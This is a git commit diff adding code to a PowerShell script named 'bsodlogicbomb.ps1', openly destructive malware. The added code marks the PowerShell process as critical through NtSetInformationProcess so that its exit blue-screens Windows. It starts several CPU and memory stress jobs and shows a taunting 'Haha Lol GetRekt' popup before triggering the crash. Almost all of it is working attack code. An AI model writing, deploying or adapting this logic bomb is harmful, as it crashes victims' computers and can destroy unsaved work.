362c5bae4b1663187494accb73d74e84f97d8ea9
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-01 14:29:37 +0700

    Add files via upload

--- bsodlogicbomb.ps1
+++ bsodlogicbomb.ps1
@@ -23,11 +23,88 @@ public static class CS{
     $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
     [CS]::Kill()
 }
+function Set-CriticalProcess {
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
+    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
+    Param (
+        [Switch]
+        $Force,
+
+        [Switch]
+        $ExitImmediately
+    )
+    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+    {
+        throw 'You must run Set-CriticalProcess from an elevated PowerShell prompt.'
+    }
+    $Response = $True
+    if (!$Force)
+    {
+        $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
+    }
+    if (!$Response)
+    {
+        return
+    }
+    $DynAssembly = New-Object System.Reflection.AssemblyName('BlueScreen')
+    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BlueScreen', $False)
+    # Define [ntdll]::NtQuerySystemInformation method
+    $TypeBuilder = $ModuleBuilder.DefineType('BlueScreen.Win32.ntdll', 'Public, Class')
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess',
+                                                        'ntdll.dll',
+                                                        ([Reflection.MethodAttributes] 'Public, Static'),
+                                                        [Reflection.CallingConventions]::Standard,
+                                                        [Int32],
+                                                        [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
+                                                        [Runtime.InteropServices.CallingConvention]::Winapi,
+                                                        [Runtime.InteropServices.CharSet]::Auto)
+    $ntdll = $TypeBuilder.CreateType()
+    $ProcHandle = [Diagnostics.Process]::GetCurrentProcess().Handle
+    $ReturnPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
+    $ProcessBreakOnTermination = 29
+    $SizeUInt32 = 4
+    try
+    {
+        $null = $ntdll::NtSetInformationProcess($ProcHandle, $ProcessBreakOnTermination, [Ref] $ReturnPtr, $SizeUInt32)
+    }
+    catch
+    {
+        return
+    }
+    Write-Verbose 'PowerShell is now marked as a critical process and will blue screen the machine upon exiting the process.'
+    if ($ExitImmediately)
+    {
+        Stop-Process -Id $PID
+    }
+}
+function Invoke-StressCPU {
+    start-job -ScriptBlock{
+    $result = 1; 
+    foreach ($number in 1..2147483647) 
+        {
+            $result = $result * $number
+        }
+    }
+}
+function Invoke-StressMem {
+    $mem_stress = "a" * 1024MB
+}
 Start-Sleep 20
 while ($true) {
-if((get-process "winlogon.exe" -ea SilentlyContinue) -eq $Null){ 
-    Write-Host "payload killed,run Invoke-GetRekt!"
-    Invoke-GetRekt    
+if((get-process "winlogon.exe" -ea SilentlyContinue) -eq $Null;){ 
+    Write-Host "payload killed,run self-destruct sequence!"
+    Set-CriticalProcess -Force
+    Invoke-StressCPU
+    Invoke-StressCPU
+    Invoke-StressCPU
+    Invoke-StressMem
+    $dialogBoxTitle = "Haha Lol GetRekt"
+    $dialogBoxMessage = "Haha lol kill me if you can,in 1 minute,you'll got BSOD."
+    $messageBox = New-Object -COMObject WScript.Shell
+    [void]$messageBox.Popup($dialogBoxMessage,0,$dialogBoxTitle,0)
+    Start-Sleep 60
+    Invoke-GetRekt
 } else { 
     echo "payload is still running"
     Start-Sleep 2 }
